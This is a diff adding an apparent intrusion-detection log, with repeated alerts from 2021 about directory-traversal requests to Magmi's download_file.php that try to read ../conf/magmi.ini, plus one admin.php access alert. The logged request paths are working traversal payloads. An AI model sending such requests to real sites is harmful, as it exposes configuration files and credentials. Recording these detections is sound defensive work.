@@ -1,0 +1,66 @@
+URI: /magmi/web/download_file.php?file=../conf/magmi.ini
+Type: Signatures::Sensitive_Signature
+Message: 192.168.65.136: WEB-MISC http directory traversal
+Signature identifier: s2b-1113-5
+Timestamp: 2021-09-14T16:41
+
+URI: /web/download_file.php?file=../conf/magmi.ini
+Type: Signatures::Sensitive_Signature
+Message: 192.168.65.136: WEB-MISC http directory traversal
+Signature identifier: s2b-1113-5
+Timestamp: 2021-09-14T16:41
+
+URI: /sites/bib3.us.es/files/magmi/web/download_file.php?file=../conf/magmi.ini
+Type: Signatures::Sensitive_Signature
+Message: 192.168.65.136: WEB-MISC http directory traversal
+Signature identifier: s2b-1113-5
+Timestamp: 2021-09-14T16:41
+
+URI: /sites/bib3.us.es/files/web/download_file.php?file=../conf/magmi.ini
+Type: Signatures::Sensitive_Signature
+Message: 192.168.65.136: WEB-MISC http directory traversal
+Signature identifier: s2b-1113-5
+Timestamp: 2021-09-14T16:41
+
+URI: /sites/bib3.us.es/files/iop_author_guide_2012.pdf&amp;sa=U&amp;ved=0ahUKEwi66sW8l6jUAhVh5IMKHcWEBHk4ZBAWCJEBMBY&amp;usg=AFQjCNEOt_tUSdoqRX8WjhtxNkM92Vt6ew/magmi/web/download_file.php?file=../conf/magmi.ini
+Type: Signatures::Sensitive_Signature
+Message: 192.168.65.136: WEB-MISC http directory traversal
+Signature identifier: s2b-1113-5
+Timestamp: 2021-09-14T16:41
+
+URI: /sites/bib3.us.es/files/iop_author_guide_2012.pdf&amp;sa=U&amp;ved=0ahUKEwi66sW8l6jUAhVh5IMKHcWEBHk4ZBAWCJEBMBY&amp;usg=AFQjCNEOt_tUSdoqRX8WjhtxNkM92Vt6ew/web/download_file.php?file=../conf/magmi.ini
+Type: Signatures::Sensitive_Signature
+Message: 192.168.65.136: WEB-MISC http directory traversal
+Signature identifier: s2b-1113-5
+Timestamp: 2021-09-14T16:41
+
+URI: /magmi/web/download_file.php?file=../conf/magmi.ini
+Type: Signatures::Sensitive_Signature
+Message: 192.168.65.136: WEB-MISC http directory traversal
+Signature identifier: s2b-1113-5
+Timestamp: 2021-09-14T16:41
+
+URI: /web/download_file.php?file=../conf/magmi.ini
+Type: Signatures::Sensitive_Signature
+Message: 192.168.65.136: WEB-MISC http directory traversal
+Signature identifier: s2b-1113-5
+Timestamp: 2021-09-14T16:41
+
+URI: /sites/bib3.us.es/files/magmi/web/download_file.php?file=../conf/magmi.ini
+Type: Signatures::Sensitive_Signature
+Message: 192.168.65.136: WEB-MISC http directory traversal
+Signature identifier: s2b-1113-5
+Timestamp: 2021-09-14T16:41
+
+URI: /sites/bib3.us.es/files/web/download_file.php?file=../conf/magmi.ini
+Type: Signatures::Sensitive_Signature
+Message: 192.168.65.136: WEB-MISC http directory traversal
+Signature identifier: s2b-1113-5
+Timestamp: 2021-09-14T16:41
+
+URI: /admin.php
+Type: Signatures::Sensitive_Signature
+Message: 192.168.65.136: WEB-PHP admin.php access
+Signature identifier: s2b-1301-11
+Timestamp: 2021-09-14T16:41
+
